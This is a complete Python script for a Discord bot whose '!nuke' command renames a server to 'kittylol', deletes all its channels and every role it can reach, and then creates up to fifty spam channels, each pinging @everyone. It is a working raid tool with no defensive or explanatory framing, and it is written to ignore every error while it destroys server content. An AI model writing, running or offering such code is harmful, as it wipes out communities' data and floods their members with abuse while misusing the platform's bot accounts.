import asyncio
import discord
from discord.ext import commands

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

TOKEN = "DISCORD_TOKEN"

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")

@bot.command()
async def nuke(ctx):
    guild = ctx.guild
    await guild.edit(name="kittylol")
    for channel in guild.channels:
        try:
            await channel.delete()
        except Exception:
            pass
    for role in list(guild.roles):
        try:
            if role != guild.default_role and role < ctx.guild.me.top_role:
                await role.delete()
        except Exception:
            pass
    for i in range(50):
        try:
            channel = await guild.create_text_channel("lol by kittylol")
            await channel.send("@everyone lol by kittylol")
            await asyncio.sleep(0.5)
        except Exception:
            await asyncio.sleep(1)
            pass

if __name__ == "__main__":
    bot.run(TOKEN)
